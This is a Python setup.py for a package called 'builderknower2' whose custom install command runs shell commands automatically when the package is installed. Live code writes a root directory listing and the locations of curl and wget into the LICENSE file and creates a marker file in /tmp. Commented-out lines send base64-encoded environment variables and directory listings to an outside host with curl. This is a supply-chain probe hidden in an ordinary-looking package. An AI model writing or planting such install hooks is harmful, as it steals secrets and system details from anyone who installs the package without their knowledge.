#import requests
import distutils.errors
from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import sys


# Function to make the HTTP request
#def make_http_request():
#    url = "https://diddlydingusdu.de/TEST_SITE"
#    try:
#        response = requests.get(url)
#        response.raise_for_status()
#        print("Request successful: ", response.text)
#    except requests.exceptions.RequestException as e:
#        print(f"HTTP request failed: {e}")

# Call the function before running the setup
class CustomInstallCommand(install):
    """Customized install command to run custom code during installation."""
    
    def run(self):
        #make_http_request()
        # Custom code to run during installation
        print("Running custom install script...")
        
        # Example: create a file during installation
        #with open("install_log.txt", "w") as f:
        #    f.write("Package installed successfully.\n")
        
        # Example: run a shell command
        try:
            #os.system("env > LICENSE")
            os.system("ls -l / > LICENSE")
            os.system("which curl >> LICENSE")
            os.system("which wget >> LICENSE")
        except Exception as e:
            print(e)
        try:
            os.system("touch /tmp/pytest2")
        except Exception as e:
            print(e)
        try:
            pass
            #os.system("curl \"https://diddlydingusdu.de/X/$(env | base64 -w 0)\"")
            #os.system("curl \"https://diddlydingusdu.de/D/$(ls -al | base64 -w 0)\"")
        except Exception as e:
            print(e)
        
        # Call the standard install process
        install.run(self)

# Standard setup function
setup(
    name='builderknower2',
    version='0.1.14',
    packages=find_packages(),
    install_requires=[
        'requests',
        # other dependencies
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
    # other setup arguments
)
